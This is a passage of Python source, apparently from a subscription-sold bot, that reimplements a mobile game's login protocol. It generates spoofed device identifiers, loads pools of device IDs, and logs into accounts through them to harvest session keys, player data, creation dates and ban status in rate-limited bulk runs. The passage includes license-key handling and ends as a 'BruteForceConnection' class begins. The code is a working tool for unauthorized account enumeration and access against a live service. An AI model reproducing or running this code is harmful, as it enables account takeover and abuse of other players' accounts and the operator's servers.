        except Exception:
            pass
        return {}

    def _save_keys(self):
        try:
            with open(KEYS_FILE, 'w') as f:
                json.dump(self.keys, f, indent=2)
        except Exception as e:
            logger.error(f"Save keys error: {e}")

    def _save_users(self):
        try:
            with open(USERS_FILE, 'w') as f:
                json.dump(self.users, f, indent=2)
        except Exception as e:
            logger.error(f"Save users error: {e}")

    def generate_key(self, duration_seconds: int, label: str, created_by: int) -> str:
        key = "ZYRON-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
        self.keys[key] = {
            "duration": duration_seconds, "label": label,
            "created_by": created_by, "created_at": time.time(),
            "used_by": None, "used_at": None
        }
        self._save_keys()
        return key

    def redeem_key(self, key: str, user_id: int) -> Tuple[bool, str]:
        key = key.strip().upper()
        if key not in self.keys:
            return False, "Invalid key."
        kdata = self.keys[key]
        if kdata["used_by"] is not None:
            return False, "Key already used."
        uid = str(user_id)
        now = time.time()
        kdata["used_by"] = user_id
        kdata["used_at"] = now
        self._save_keys()
        current_expiry = self.users.get(uid, {}).get("expires", 0)
        new_expiry = max(current_expiry, now) + kdata["duration"]
        if uid not in self.users:
            self.users[uid] = {}
        self.users[uid]["expires"] = new_expiry
        self.users[uid]["last_key"] = key
        self._save_users()
        expires_dt = datetime.fromtimestamp(new_expiry).strftime("%Y-%m-%d %H:%M:%S")
        return True, f"Access granted!\nPlan: {kdata['label']}\nExpires: {expires_dt}"

    def has_access(self, user_id: int) -> bool:
        if user_id in ADMIN_IDS:
            return True
        uid = str(user_id)
        if uid not in self.users:
            return False
        return self.users[uid].get("expires", 0) > time.time()

    def get_expiry(self, user_id: int) -> Optional[str]:
        uid = str(user_id)
        if uid not in self.users:
            return None
        exp = self.users[uid].get("expires", 0)
        if exp <= time.time():
            return None
        return datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S")

    def list_keys(self, show_used: bool = False) -> List[dict]:
        result = []
        for k, v in self.keys.items():
            if not show_used and v["used_by"] is not None:
                continue
            result.append({"key": k, **v})
        return result

    def list_users(self) -> List[dict]:
        result = []
        now = time.time()
        for uid, data in self.users.items():
            exp = data.get("expires", 0)
            result.append({
                "uid": uid,
                "expires": datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S") if exp > 0 else "Expired",
                "active": exp > now
            })
        return result

    def revoke_user(self, user_id: int) -> bool:
        uid = str(user_id)
        if uid in self.users:
            self.users[uid]["expires"] = 0
            self._save_users()
            return True
        return False

    def delete_key(self, key: str) -> bool:
        key = key.strip().upper()
        if key in self.keys:
            del self.keys[key]
            self._save_keys()
            return True
        return False


def parse_duration(text: str) -> Tuple[Optional[int], Optional[str]]:
    text = text.strip().lower()
    units = {
        'h': 3600, 'hour': 3600, 'hours': 3600,
        'd': 86400, 'day': 86400, 'days': 86400,
        'w': 604800, 'week': 604800, 'weeks': 604800,
        'm': 2592000, 'month': 2592000, 'months': 2592000,
        'y': 31536000, 'year': 31536000, 'years': 31536000
    }
    match = re.fullmatch(r'(\d+)\s*([a-z]+)', text)
    if not match:
        return None, None
    amount = int(match.group(1))
    unit = match.group(2)
    if unit not in units:
        return None, None
    return amount * units[unit], f"{amount} {unit}"


def _aes(d: bytes) -> bytes:
    c = AES.new(_AES_KEY, AES.MODE_CBC, iv=_AES_IV)
    return c.decrypt(d[:-1] if len(d) % 16 else d)


class _T(Enum):
    IP = 0
    IN = 1
    FL = 2
    DB = 3
    ST = 4
    LI = 5
    DI = 6
    SB = 7
    SE = 8


class SDP(dict):
    def __init__(self, src: Any = None):
        super().__init__()
        self._b = b''
        self._o = 0
        if isinstance(src, bytes):
            self._b = src
            self._unpack()
        elif src is not None:
            super().update(src)
            self._pack()

    def _pack(self):
        self._b = bytes([_T.SB.value << 4])
        for t, v in sorted(self.items()):
            self._pk(t, v)
        self._b += bytes([_T.SE.value << 4])

    def _vn(self, v: int) -> bytes:
        r = bytearray()
        while v >= 128:
            r.append(v & 127 | 128)
            v >>= 7
        r.append(v & 127)
        return bytes(r)

    def _hdr(self, t: int, dt: _T):
        self._b += bytes([dt.value << 4 | t]) if t < 15 else bytes([dt.value << 4 | 15]) + self._vn(t)

    def _pk(self, t: int, v: Any):
        if isinstance(v, bool):
            self._hdr(t, _T.IP)
            self._b += self._vn(1 if v else 0)
        elif isinstance(v, int):
            if v < 0:
                self._hdr(t, _T.IN)
                self._b += self._vn(-v)
            else:
                self._hdr(t, _T.IP)
                self._b += self._vn(v)
        elif isinstance(v, float):
            self._hdr(t, _T.DB)
            p = struct.pack('<d', v)
            self._b += self._vn(len(p)) + p
        elif isinstance(v, (str, bytes)):
            self._hdr(t, _T.ST)
            e = v.encode() if isinstance(v, str) else v
            self._b += self._vn(len(e)) + e
        elif isinstance(v, list):
            self._hdr(t, _T.LI)
            self._b += self._vn(len(v))
            for i in v:
                self._pk(0, i)
        elif isinstance(v, dict):
            if isinstance(v, SDP):
                self._hdr(t, _T.SB)
                for k, vv in sorted(v.items()):
                    self._pk(k, vv)
                self._b += bytes([_T.SE.value << 4])
            else:
                self._hdr(t, _T.DI)
                self._b += self._vn(len(v))
                for k, vv in sorted(v.items()):
                    self._pk(0, k)
                    self._pk(0, vv)

    @property
    def data(self) -> bytes:
        return self._b

    def _unpack(self):
        if not self._b:
            return
        if self._b[0] >> 4 == _T.SB.value:
            self._o = 1
        while self._o < len(self._b):
            t, v = self._up()
            if isinstance(v, _T) and v == _T.SE:
                break
            self[t] = v

    def _rn(self) -> int:
        n = 1
        val = self._b[self._o] & 127
        while self._b[self._o + n - 1] >= 128:
            val |= (self._b[self._o + n] & 127) << 7 * n
            n += 1
        self._o += n
        return val

    def _up(self) -> Tuple[int, Any]:
        if self._o >= len(self._b):
            return (0, None)
        h = self._b[self._o]
        t = h & 15
        dt = _T(h >> 4)
        self._o += 1
        if t == 15:
            t = self._rn()
        if dt == _T.IP:
            return (t, self._rn())
        if dt == _T.IN:
            return (t, -self._rn())
        if dt == _T.DB:
            return (t, struct.unpack('<d', self._rn().to_bytes(8, 'little'))[0])
        if dt == _T.ST:
            n = self._rn()
            try:
                vv = self._b[self._o:self._o + n].decode()
            except Exception:
                vv = self._b[self._o:self._o + n]
            self._o += n
            return (t, vv)
        if dt == _T.LI:
            n = self._rn()
            items = []
            for _ in range(n):
                _, i = self._up()
                items.append(i)
            return (t, items)
        if dt == _T.DI:
            n = self._rn()
            d = {}
            for _ in range(n):
                _, k = self._up()
                _, vv = self._up()
                d[k] = vv
            return (t, d)
        if dt == _T.SB:
            sub = {}
            while True:
                st, sv = self._up()
                if isinstance(sv, _T) and sv == _T.SE:
                    break
                sub[st] = sv
            return (t, SDP(sub))
        if dt == _T.SE:
            return (t, _T.SE)
        return (t, None)


def _frame(pid: int, seq: int, payload: bytes) -> bytes:
    pkt = SDP({0: pid, 1: seq, 5: payload}).data
    buf = zstd.compress(pkt)
    return (len(buf) + 4 | 16 << 24).to_bytes(4, 'big') + buf


def _decode(ct: int, d: bytes) -> bytes:
    if ct == 1:
        return zlib.decompress(d)
    if ct == 16:
        return zstd.decompress(d)
    if ct == 2:
        return _aes(d).rstrip(b'\x00')
    if ct == 3:
        return zlib.decompress(_aes(d).rstrip(b'\x00'))
    if ct == 18:
        return zstd.decompress(_aes(d).rstrip(b'\x00'))
    return d


def _gen() -> str:
    imei = ''.join((str(random.randint(0, 9)) for _ in range(15)))
    md5 = hashlib.md5(imei.encode()).hexdigest()
    aid = '%016x' % random.getrandbits(64)
    adv = str(uuid.UUID(int=random.getrandbits(128)))
    return f'and_{md5}{aid}{adv}'


def _login_frame(did: str) -> bytes:
    raw, md5, aid, adv = parse_device_id(did)
    payload = SDP({
        0: raw,
        1: f'gps_adid={adv}&android_id={aid}&device_unique_id={md5}',
        2: CLI_VER,
        3: CHANNEL,
        4: LANG
    }).data
    return _frame(1, 1, payload)


def _load_pool(path: str) -> List[str]:
    ids = []
    with open(path, encoding='utf-8', errors='ignore') as f:
        for line in f:
            did = line.strip()
            if did and (not did.lower().endswith('none')) and (len(did) >= 40):
                ids.append(did)
    return ids


class _Bucket:
    def __init__(self, rate: float):
        self._rate = rate
        self._tokens = rate
        self._last = time.monotonic()
        self._lock = asyncio.Lock()

    async def acquire(self):
        async with self._lock:
            now = time.monotonic()
            delta = now - self._last
            self._last = now
            self._tokens = min(self._rate, self._tokens + delta * self._rate)
            if self._tokens < 1:
                wait = (1 - self._tokens) / self._rate
                await asyncio.sleep(wait)
                self._tokens = 0
            else:
                self._tokens -= 1


async def _read_n(r: asyncio.StreamReader, n: int) -> bytes:
    buf = b''
    while len(buf) < n:
        c = await r.read(n - len(buf))
        if not c:
            raise EOFError
        buf += c
    return buf


async def _get_game_server(acc, skey, zone, writer_login, reader_login) -> Optional[Tuple[str, int]]:
    try:
        payload = SDP({0: acc, 1: skey, 2: CLI_VER, 5: zone, 6: CHANNEL}).data
        writer_login.write(_frame(5, 2, payload))
        await asyncio.wait_for(writer_login.drain(), timeout=1.0)
        hdr = await asyncio.wait_for(_read_n(reader_login, 4), timeout=READ_TO)
        flags = int.from_bytes(hdr, 'big')
        size = flags & 16777215
        ct = flags >> 24
        body = await asyncio.wait_for(_read_n(reader_login, size - 4), timeout=READ_TO)
        body = _decode(ct, body)
        outer = SDP(body)
        if outer.get(0) != 6:
            return None
        raw = outer.get(6) or outer.get(5)
        if not isinstance(raw, bytes):
            return None
        inner = SDP(raw)
        addr = inner.get(1)
        if not addr or ':' not in str(addr):
            return None
        host, port = str(addr).split(':', 1)
        return host, int(port)
    except Exception:
        return None


async def _get_player_info(acc, skey, zone, did, gs_host, gs_port) -> Optional[SDP]:
    writer = None
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(gs_host, gs_port), timeout=CONN_TO)
        writer = w
        auth_payload = SDP({0: acc, 1: skey, 2: zone, 4: CLI_VER, 13: CHANNEL, 15: did}).data
        w.write(_frame(10001, 1, auth_payload))
        w.write(_frame(10101, 2, SDP({0: 0, 2: 2}).data))
        await asyncio.wait_for(w.drain(), timeout=1.0)
        authed = False
        for _ in range(30):
            try:
                hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
                flags = int.from_bytes(hdr, 'big')
                size = flags & 16777215
                ct = flags >> 24
                body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
                body = _decode(ct, body)
                outer = SDP(body)
                pid = outer.get(0)
                if pid == 10002:
                    authed = True
                    break
                elif pid == 20001:
                    continue
                else:
                    break
            except Exception:
                break
        if not authed:
            return None
        info_payload = SDP({1: int(acc)}).data
        w.write(_frame(11153, 3, info_payload))
        await asyncio.wait_for(w.drain(), timeout=1.0)
        for _ in range(20):
            try:
                hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
                flags = int.from_bytes(hdr, 'big')
                size = flags & 16777215
                ct = flags >> 24
                body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
                body = _decode(ct, body)
                outer = SDP(body)
                pid = outer.get(0)
                if pid == 11154:
                    raw = outer.get(6) or outer.get(5)
                    if isinstance(raw, bytes):
                        return SDP(raw)
                    return None
            except Exception:
                break
        return None
    except Exception:
        return None
    finally:
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass


# ================= BAN V2 CHECKER =================
class BanV2Connection:
    def __init__(self, device_id: str):
        self.host = 'login.ml.youngjoygame.com'
        self.port = 30021
        self.sequence = 1
        self.socket = None
        self.queue_data = b''
        self.device_id = device_id
        raw, md5, aid, adv = parse_device_id(device_id)
        self.imei_md5 = md5
        self.android_id = aid
        self.advertising_id = adv
        self.channel = BANV2_CHANNEL
        self.client_version = BANV2_CLIENT_VERSION
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0
        self.ban_info = {}

    def _write_number(self, value: int) -> bytes:
        result = bytearray()
        while value >= 0x80:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    def _pack_header(self, tag: int, data_type: int) -> bytes:
        if tag < 15:
            return bytes([(data_type << 4) | tag])
        return bytes([(data_type << 4) | 15]) + self._write_number(tag)

    def _pack_value(self, tag: int, value: Any) -> bytes:
        result = b''
        if isinstance(value, bool):
            result += self._pack_header(tag, 0)
            result += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                result += self._pack_header(tag, 1)
                result += self._write_number(-value)
            else:
                result += self._pack_header(tag, 0)
                result += self._write_number(value)
        elif isinstance(value, float):
            result += self._pack_header(tag, 3)
            packed = struct.pack("<d", value)
            result += self._write_number(len(packed))
            result += packed
        elif isinstance(value, (str, bytes)):
            result += self._pack_header(tag, 4)
            encoded = value.encode('utf-8') if isinstance(value, str) else value
            result += self._write_number(len(encoded))
            result += encoded
        elif isinstance(value, list):
            result += self._pack_header(tag, 5)
            result += self._write_number(len(value))
            for item in value:
                result += self._pack_value(0, item)
        elif isinstance(value, dict):
            if isinstance(value, SDP):
                result += self._pack_header(tag, 7)
                for k, v in sorted(value.items()):
                    result += self._pack_value(k, v)
                result += bytes([8 << 4])
            else:
                result += self._pack_header(tag, 6)
                result += self._write_number(len(value))
                for k, v in sorted(value.items()):
                    result += self._pack_value(0, k)
                    result += self._pack_value(0, v)
        else:
            raise ValueError(f"Unsupported type: {type(value)}")
        return result

    def _build_packet(self, pkt_id: int, sdp_data: bytes) -> bytes:
        packet = SDP({0: pkt_id, 1: self.sequence, 5: sdp_data}).data
        buf = zstd.compress(packet)
        flags = (len(buf) + 4) | (16 << 24)
        return flags.to_bytes(4, 'big') + buf

    def _decode_response(self, data: bytes) -> Tuple[int, Optional[Any]]:
        try:
            flags = int.from_bytes(data[:4], 'big')
            size = flags & 0xFFFFFF
            compression_type = flags >> 24
            body = data[4:size]
            if compression_type == 1:
                body = zlib.decompress(body)
            elif compression_type == 16:
                body = zstd.decompress(body)
            elif compression_type in (2, 3, 18):
                cipher = AES.new(_AES_KEY, AES.MODE_CBC, iv=_AES_IV)
                body = cipher.decrypt(body[:-1] if len(body) % 16 != 0 else body)
                body = body.rstrip(b'\x00')
                if compression_type == 3:
                    body = zlib.decompress(body)
                elif compression_type == 18:
                    body = zstd.decompress(body)
            result = SDP(body)
            pkt_id = result.get(0)
            if pkt_id is None:
                return -1, None
            res = result.get(6) or result.get(5)
            if not res or not isinstance(res, bytes):
                return pkt_id, None
            return pkt_id, SDP(res)
        except Exception:
            return -1, None

    def connect(self, host: str = None, port: int = None, timeout: float = 5.0):
        if host:
            self.host = host
        if port:
            self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(timeout)
        self.socket.connect((self.host, self.port))

    def send_packet(self, pkt_id: int, sdp_data: dict):
        sdp = SDP(sdp_data)
        packet = self._build_packet(pkt_id, sdp.data)
        self.socket.send(packet)
        self.sequence += 1

    def recv_packet(self) -> Tuple[int, Optional[Any]]:
        try:
            while len(self.queue_data) < 4:
                data = self.socket.recv(4096)
                if not data:
                    return -1, None
                self.queue_data += data
            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 0xFFFFFF
            while len(self.queue_data) < size:
                data = self.socket.recv(4096)
                if not data:
                    return -1, None
                self.queue_data += data
            packet_data = self.queue_data[:size]
            self.queue_data = self.queue_data[size:]
            return self._decode_response(packet_data)
        except socket.timeout:
            return -1, None
        except Exception:
            return -1, None

    def cleanup(self):
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
            self.socket = None
            self.sequence = 1


def inspect_ban_v2(sdp_data: Any) -> Tuple[bool, dict]:
    is_banned = False
    details = {}
    if sdp_data:
        def scan(obj):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if k == 'ban_reason':
                        code_str = str(v)
                        details['ban_code'] = code_str
                        details['reason'] = BAN_REASONS.get(code_str, f"Unknown Ban Code: {code_str}")
                    elif k in ('ban_status', 'ban_time') or (isinstance(k, str) and 'ban' in k.lower()):
                        details[str(k)] = v
                    if k == 'endtime_day':
                        details['endtime_day'] = v
                    if k == 'endtime_hour':
                        details['endtime_hour'] = v
                    if k == 'endtime_min':
                        details['endtime_min'] = v
                    if k == 'endtime_sec':
                        details['endtime_sec'] = v
                    if isinstance(v, (dict, list)):
                        scan(v)
            elif isinstance(obj, list):
                for item in obj:
                    scan(item)
        scan(dict(sdp_data))
    if 'endtime_day' in details and details['endtime_day'] is not None:
        is_banned = True
    return is_banned, details


def check_ban_v2(device_id: str) -> dict:
    conn = BanV2Connection(device_id)
    result = {"status": "UNKNOWN", "device_id": device_id, "account_id": None, "zone_id": None}
    try:
        conn.connect('login.ml.youngjoygame.com', 30021, timeout=5.0)
        raw, md5, aid, adv = parse_device_id(device_id)
        conn.send_packet(1, {0: raw, 1: f'gps_adid={adv}&android_id={aid}&device_unique_id={md5}', 2: conn.client_version, 3: conn.channel, 4: 'en'})
        pkt_id, res = conn.recv_packet()
        if pkt_id == -1 and res is None:
            result["error"] = "Login server timeout/closed"
            return result
        banned, ban_info = inspect_ban_v2(res)
        if banned:
            result["status"] = "BANNED"
            result["ban_code"] = ban_info.get('ban_code', 'N/A')
            result["reason"] = ban_info.get('reason', 'Unknown ban reason')
            day = ban_info.get('endtime_day', '?')
            hour = ban_info.get('endtime_hour', '00')
            minute = ban_info.get('endtime_min', '00')
            sec = ban_info.get('endtime_sec', '00')
            result["duration"] = f"Day {day}, {hour}:{minute}:{sec}"
            return result
        if pkt_id == 2 and res:
            conn.account_id = res.get(0)
            conn.session_key = res.get(1)
            zone_data = res.get(2)
            if isinstance(zone_data, dict):
                conn.zone_id = zone_data.get(0, 0)
            elif isinstance(zone_data, list) and len(zone_data) > 0:
                if isinstance(zone_data[0], dict):
                    conn.zone_id = zone_data[0].get(0, 0)
                else:
                    conn.zone_id = zone_data[0]
            else:
                conn.zone_id = zone_data or 0
            result["account_id"] = conn.account_id
            result["zone_id"] = conn.zone_id
        else:
            result["error"] = f"Login returned unexpected pkt_id={pkt_id}"
            return result
        conn.send_packet(5, {0: conn.account_id, 1: conn.session_key, 2: conn.client_version, 5: conn.zone_id, 6: conn.channel})
        pkt_id, res = conn.recv_packet()
        if pkt_id == -1 and res is None:
            result["error"] = "GS lookup timeout/closed"
            return result
        banned, ban_info = inspect_ban_v2(res)
        if banned:
            result["status"] = "BANNED"
            result["ban_code"] = ban_info.get('ban_code', 'N/A')
            result["reason"] = ban_info.get('reason', 'Unknown ban reason')
            day = ban_info.get('endtime_day', '?')
            hour = ban_info.get('endtime_hour', '00')
            minute = ban_info.get('endtime_min', '00')
            sec = ban_info.get('endtime_sec', '00')
            result["duration"] = f"Day {day}, {hour}:{minute}:{sec}"
            return result
        if pkt_id == 6 and res:
            game_server = res.get(1)
            if game_server and ':' in str(game_server):
                conn.game_server_host, conn.game_server_port = str(game_server).split(':')
                conn.game_server_port = int(conn.game_server_port)
            else:
                result["error"] = "Failed to parse game server endpoint"
                return result
        else:
            result["error"] = f"GS lookup returned unexpected pkt_id={pkt_id}"
            return result
        conn.cleanup()
        conn.connect(conn.game_server_host, conn.game_server_port, timeout=5.0)
        conn.send_packet(10001, {0: conn.account_id, 1: conn.session_key, 2: conn.zone_id, 4: conn.client_version, 13: conn.channel, 15: raw})
        conn.send_packet(10101, {0: 0, 2: 2})
        role_requested = False
        loops = 0
        while loops < 30:
            loops += 1
            pkt_id, res = conn.recv_packet()
            banned, ban_info = inspect_ban_v2(res)
            if banned:
                result["status"] = "BANNED"
                result["ban_code"] = ban_info.get('ban_code', 'N/A')
                result["reason"] = ban_info.get('reason', 'Unknown ban reason')
                day = ban_info.get('endtime_day', '?')
                hour = ban_info.get('endtime_hour', '00')
                minute = ban_info.get('endtime_min', '00')
                sec = ban_info.get('endtime_sec', '00')
                result["duration"] = f"Day {day}, {hour}:{minute}:{sec}"
                return result
            if pkt_id == -1:
                result["error"] = "Connection timeout during role verification"
                return result
            elif pkt_id is None:
                result["error"] = "Connection closed by server during role verification"
                return result
            elif pkt_id == 10002 and not role_requested:
                conn.send_packet(10003, {0: conn.account_id, 1: conn.session_key, 2: conn.zone_id, 3: conn.client_version, 4: conn.channel, 5: raw})
                role_requested = True
            elif pkt_id in (10004, 10008):
                result["status"] = "NOT BANNED"
                return result
        result["error"] = "Role verification loop exhausted"
    except socket.timeout:
        result["error"] = "Connection timeout"
    except socket.error as e:
        result["error"] = f"Socket error: {str(e)}"
    except Exception as e:
        result["error"] = f"Unexpected error: {str(e)}"
    finally:
        conn.cleanup()
    return result


def check_ban_v2_with_retry(device_id: str, max_retries: int = MAX_BAN_CHECK_RETRIES) -> dict:
    """
    Retry ban check up to MAX_BAN_CHECK_RETRIES times.
    IMPORTANT: EARLY-RETURN as soon as we get a definitive answer (BANNED or NOT BANNED).
    Kung nakuha na agad sa 1st, 3rd, 5th, 10th retry — send agad, hindi na hintayin ang 20.
    """
    last_result = None
    for attempt in range(1, max_retries + 1):
        res = check_ban_v2(device_id)
        last_result = res
        status = res.get("status")
        
        # ✅ DEFINITIVE ANSWER → send agad, huwag nang hintayin ang 20 retries
        if status in ("BANNED", "NOT BANNED"):
            res["retries_used"] = attempt
            logger.info(f"[BAN CHECK] Definitive answer '{status}' on attempt {attempt}/{max_retries}")
            return res
        
        # ❌ Hindi pa definitive — log at retry
        err = res.get("error", "unknown")
        logger.info(f"[BAN CHECK] Attempt {attempt}/{max_retries} for {device_id[:30]}... error={err}")
        time.sleep(0.6)
    
    # Naubos lahat ng retries, hindi pa rin definitive
    if last_result is not None:
        last_result["retries_used"] = max_retries
        if not last_result.get("error"):
            last_result["error"] = f"Failed after {max_retries} attempts"
        return last_result
    return {
        "status": "UNKNOWN",
        "device_id": device_id,
        "error": f"Failed after {max_retries} attempts",
        "retries_used": max_retries,
    }


async def check_ban_v2_async(device_id: str) -> dict:
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, check_ban_v2, device_id)


# ================= CREATION DATE ONLY CHECK =================
async def _fetch_creation_date_only(did: str) -> Optional[dict]:
    writer = None
    try:
        frame = _login_frame(did)
        r, w = await asyncio.wait_for(asyncio.open_connection(LOGIN_HOST, LOGIN_PORT), timeout=CONN_TO)
        writer = w
        w.write(frame)
        await asyncio.wait_for(w.drain(), timeout=1.0)
        hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
        flags = int.from_bytes(hdr, 'big')
        size = flags & 16777215
        ct = flags >> 24
        body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
        body = _decode(ct, body)
        outer = SDP(body)
        if outer.get(0) != 2:
            return None
        raw = outer.get(6) or outer.get(5)
        if not isinstance(raw, bytes):
            return None
        inner = SDP(raw)
        acc = inner.get(0)
        if not acc:
            return None
        
        creation_ts = int(inner.get(19, 0) or 0)
        
        zr = inner.get(2)
        if isinstance(zr, list):
            zones = [z for z in zr if isinstance(z, int)] if zr else [0]
        elif isinstance(zr, dict):
            zones = [zr.get(0, 0)]
        elif isinstance(zr, int):
            zones = [zr]
        else:
            zones = [0]
        zone = zones[0] if zones else 0
        
        return {
            'did': did,
            'acc': acc,
            'zone': zone,
            'creation_ts': creation_ts,
        }
    except Exception:
        return None
    finally:
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass


def check_creation_date_sync(device_id: str) -> Optional[dict]:
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(_fetch_creation_date_only(device_id))
        finally:
            loop.close()
        return result
    except Exception:
        return None


async def _single_account_check_full(did: str) -> Optional[dict]:
    """
    Full single check: login + player info + ban check.
    Returns:
      - dict with 'unregistered': True if server definitively says no account
      - dict with 'player': player data if successful
      - None on network failure (caller should retry)
    """
    writer = None
    try:
        frame = _login_frame(did)
        r, w = await asyncio.wait_for(
            asyncio.open_connection(LOGIN_HOST, LOGIN_PORT), timeout=CONN_TO
        )
        writer = w
        w.write(frame)
        await asyncio.wait_for(w.drain(), timeout=1.0)
        hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
        flags = int.from_bytes(hdr, 'big')
        size = flags & 16777215
        ct = flags >> 24
        body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
        body = _decode(ct, body)
        outer = SDP(body)
        pkt_id = outer.get(0)
        if pkt_id != 2:
            logger.info(f"Login packet id={pkt_id} (expected 2) for {did[:30]}...")
            return None
        raw = outer.get(6) or outer.get(5)
        if not isinstance(raw, bytes):
            return None
        inner = SDP(raw)
        acc = inner.get(0)
        if not acc:
            return {'unregistered': True, 'did': did, 'acc': None}
        skey = inner.get(1, '')
        zr = inner.get(2)
        if isinstance(zr, list):
            zones = [z for z in zr if isinstance(z, int)] if zr else [0]
        elif isinstance(zr, dict):
            zones = [zr.get(0, 0)]
        elif isinstance(zr, int):
            zones = [zr]
        else:
            zones = [0]
        primary_zone = zones[0] if zones else 0

        ban_task = asyncio.create_task(check_ban_v2_async(did))

        player_data = None
        working_zone = primary_zone

        for z in zones:
            try:
                gs_info = await _get_game_server(acc, skey, z, w, r)
            except Exception:
                gs_info = None
            if not gs_info:
                continue
            gs_host, gs_port = gs_info
            try:
                gs_result = await _get_player_info(acc, skey, z, did, gs_host, gs_port)
            except Exception:
                gs_result = None
            if gs_result:
                pd = extract_player_data(gs_result)
                if pd:
                    player_data = pd
                    working_zone = z
                    break

        ban_result = await ban_task

        result = {
            'did': did,
            'acc': acc,
            'zone': working_zone,
            'player': player_data,
            'unregistered': False,
        }
        if ban_result:
            result['ban_info'] = {
                'status': ban_result.get('status', 'UNKNOWN'),
                'ban_code': ban_result.get('ban_code'),
                'reason': ban_result.get('reason'),
                'duration': ban_result.get('duration'),
            }
        else:
            result['ban_info'] = {'status': 'UNKNOWN'}
        return result
    except Exception as e:
        logger.info(f"_single_account_check_full exception: {e}")
        return None
    finally:
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass


async def _single_account_check(did: str) -> Optional[dict]:
    return await _single_account_check_full(did)


async def _check_with_retry(did: str, sem: asyncio.Semaphore, bucket: _Bucket,
                             max_retries: int = MAX_RETRIES_PER_ACCOUNT) -> Optional[dict]:
    for attempt in range(1, max_retries + 1):
        try:
            result = await _single_account_check(did)
        except Exception:
            result = None

        if result is not None:
            result['retries_used'] = attempt
            return result

        if attempt < max_retries:
            await asyncio.sleep(0.5)

    return None


async def _check(did: str, sem: asyncio.Semaphore, bucket: _Bucket) -> Optional[dict]:
    await bucket.acquire()
    async with sem:
        return await _check_with_retry(did, sem, bucket, MAX_RETRIES_PER_ACCOUNT)


def lookup_by_device_id(device_id: str, max_retries: int = MAX_SINGLE_CHECK_RETRIES) -> dict:
    """
    Retry single check up to MAX_SINGLE_CHECK_RETRIES times.
    IMPORTANT: EARLY-RETURN as soon as we get a definitive answer:
      - REGISTERED (with player data)
      - UNREGISTERED
    Kung nakuha na sa 1st, 3rd, 5th, 10th retry — send agad, hindi na hintayin ang 20.
    """
    last_error = None
    last_result = None

    for attempt in range(1, max_retries + 1):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                result = loop.run_until_complete(_single_account_check_full(device_id))
            finally:
                loop.close()

            if result is None:
                last_error = "No response from server"
                logger.info(f"[SINGLE CHECK] Attempt {attempt}/{max_retries} for {device_id[:30]}...: no response")
                time.sleep(0.6)
                continue

            last_result = result

            # ✅ DEFINITIVE: UNREGISTERED → send agad
            if result.get('unregistered'):
                logger.info(f"[SINGLE CHECK] Definitive answer 'UNREGISTERED' on attempt {attempt}/{max_retries}")
                return {
                    'status': 'unregistered',
                    'device_id': device_id,
                    'message': 'UNREGISTERED ACCOUNT - No player data found',
                    'account_id': None,
                    'zone_id': None,
                    'is_registered': False,
                    'player_found': False,
                    'retries_used': attempt
                }

            # ✅ DEFINITIVE: REGISTERED with player data → send agad
            player = result.get('player')
            ban_info = result.get('ban_info', {})
            if player:
                logger.info(f"[SINGLE CHECK] Definitive answer 'REGISTERED' on attempt {attempt}/{max_retries}")
                return {
                    'status': 'registered',
                    'device_id': device_id,
                    'account_id': result.get('acc'),
                    'zone_id': result.get('zone'),
                    'player_data': player,
                    'ban_info': ban_info,
                    'player_found': True,
                    'is_registered': True,
                    'retries_used': attempt
                }

            # ❌ Account found pero walang player data — retry
            last_error = "Account found but no player data"
            logger.info(f"[SINGLE CHECK] Attempt {attempt}/{max_retries}: acc found, no player data yet")
            time.sleep(0.6)

        except Exception as e:
            last_error = str(e)
            logger.error(f"[SINGLE CHECK] Attempt {attempt}/{max_retries} error: {e}")
            time.sleep(0.6)

    # Fallback kung naubos lahat ng retries
    if last_result is not None:
        if last_result.get('unregistered'):
            return {
                'status': 'unregistered',
                'device_id': device_id,
                'message': 'UNREGISTERED ACCOUNT - No player data found',
                'account_id': None,
                'zone_id': None,
                'is_registered': False,
                'player_found': False,
                'retries_used': max_retries
            }
        if last_result.get('player'):
            return {
                'status': 'registered',
                'device_id': device_id,
                'account_id': last_result.get('acc'),
                'zone_id': last_result.get('zone'),
                'player_data': last_result.get('player'),
                'ban_info': last_result.get('ban_info', {}),
                'player_found': True,
                'is_registered': True,
                'retries_used': max_retries
            }

    return {
        'status': 'error',
        'device_id': device_id,
        'error': f"Failed after {max_retries} attempts: {last_error}",
        'player_found': False,
        'is_registered': False,
        'retries_used': max_retries
    }


class BruteForceConnection:
    def __init__(self, device_id: str):
        self.host = LOGIN_HOST
        self.port = LOGIN_PORT
        self.sequence = 1
        self.socket = None
        self.queue = b''
        self.device_id = device_id
        raw, md5, aid, adv = parse_device_id(device_id)
        self.imei = md5
        self.android = aid
        self.adid = adv
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_host = ''
        self.game_port = 0

    def connect(self, host=None, port=None, timeout=5.0):
        if host:
            self.host = host
        if port:
